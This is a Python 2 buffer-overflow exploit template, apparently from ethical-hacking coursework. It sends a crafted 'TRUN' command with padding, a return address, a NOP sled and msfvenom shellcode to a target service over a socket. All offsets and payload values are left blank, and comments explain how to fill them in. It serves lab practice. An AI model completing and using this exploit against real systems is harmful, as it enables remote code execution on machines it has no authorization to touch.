#!/usr/bin/python2
#Inspiration for this came from TCM Academy's Practical Ethical Hacking course in the Buffer Overflow section and tryhackme's bufferoverflowprep room

import sys, socket

#Target IP (machine running program being targeted)
RHOST = '192.168.50.13'
#Target port (port on machine where you can connect to the target program)
RPORT = 9999  

#Vulnerable command of program (found by spiking/fuzzing program)
COMM = 'TRUN /.:/'
#Discovered offset (final number from simplefuzzer tool output)
OFFSET = 0
#Character to use for buffer
BUFF = 'A' * OFFSET
#Discovered return address (in reverse- if it was 00 01 02[\x00\x01\x02] JMP would be \x02\x01\x00
JMP = ''
# Adding padding (NOP)- sometimes it needs to be smaller (*16 or *8)
NOP = ''
#Adding shellcode for exploitation (payload from msfvenom)
OVERFLOW = (
)
 
#Line of coding combining all above variables into a variable called TEST for ease of use 
TEST = COMM + BUFF + JMP + NOP + OVERFLOW
#Line of code setting up socket 
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)

try:
        #connect to target at specified port
        s.connect((RHOST, RPORT))
        #send the payload TEST to the target program
        s.send((TEST))
        #close the connection
        s.close()

except:
        print "Error connecting to server"
        sys.exit()
